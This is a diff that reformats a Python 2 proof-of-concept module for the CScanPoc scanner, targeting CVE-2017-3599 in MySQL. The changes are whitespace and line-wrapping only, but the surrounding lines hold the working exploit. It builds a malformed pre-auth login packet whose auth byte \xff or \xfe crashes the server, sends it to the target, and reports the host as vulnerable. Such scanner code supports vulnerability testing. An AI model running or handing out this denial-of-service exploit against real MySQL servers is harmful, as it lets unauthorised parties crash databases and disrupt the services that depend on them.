@@ -2,17 +2,18 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import socket 
+import socket
 import sys
 from struct import pack
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MySQL_0001' # 平台漏洞编号，留空
+    vuln_id = 'MySQL_0001'  # 平台漏洞编号，留空
     name = 'MySQL < 5.6.35 / < 5.7.17 - Integer Overflow'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2016-12-06'  # 漏洞公布时间
     desc = '''
     Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. 
@@ -27,6 +28,7 @@ class Vuln(ABVuln):
     product = 'MySQL'  # 漏洞应用名称
     product_version = '< 5.6.35 / < 5.7.17'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '43118ea7-b29d-42aa-a687-8f25f17181b9'
     author = '47bwy'  # POC编写者
@@ -39,7 +41,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             '''
             CVE-2017-3599 Proof of Concept exploit code.
             https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/
@@ -79,18 +81,18 @@ class Poc(ABPoc):
 
             '''
 
-
             # packet_len = '\x64\x00\x00'
             packet_num = '\x01'
-            #Login request packet
+            # Login request packet
             packet_cap = '\x85\xa2\xbf\x01'     # client capabilities (default)
             packet_max = '\x00\x00\x00\x01'     # max packet size (default)
             packet_cset = '\x21'                # charset (default)
-            p_reserved = '\x00' * 23            # 23 bytes reserved with nulls (default)
-            packet_usr =  'test\x00'            # username null terminated (default)
+            # 23 bytes reserved with nulls (default)
+            p_reserved = '\x00' * 23
+            # username null terminated (default)
+            packet_usr = 'test\x00'
 
-            packet_auth  = '\xff'           # both \xff and \xfe crash the server
-
+            packet_auth = '\xff'           # both \xff and \xfe crash the server
 
             '''
             Conditions to crash:
@@ -102,7 +104,8 @@ class Poc(ABPoc):
             (null terminated or length encoded) depending on the client functionality.
             '''
 
-            packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth 
+            packet = packet_cap + packet_max + packet_cset + \
+                p_reserved + packet_usr + packet_auth
             packet_len = pack('i', len(packet))[:3]
             request = packet_len + packet_num + packet
 
@@ -118,11 +121,12 @@ class Poc(ABPoc):
                 print "[+] Connected."
 
             except:
-                print "[+] Unable to connect to host " + HOST + " on port " + str(PORT) + "."   
+                print "[+] Unable to connect to host " + \
+                    HOST + " on port " + str(PORT) + "."
                 s.close()
                 # print "[+] Exiting."
                 exit(0)
- 
+
             # print "[+] Receiving greeting from remote host..."
             data = s.recv(1024)
             # print "[+] Done."
@@ -134,12 +138,13 @@ class Poc(ABPoc):
             self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                 target=self.target, name=self.vuln.name))
             s.close()
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
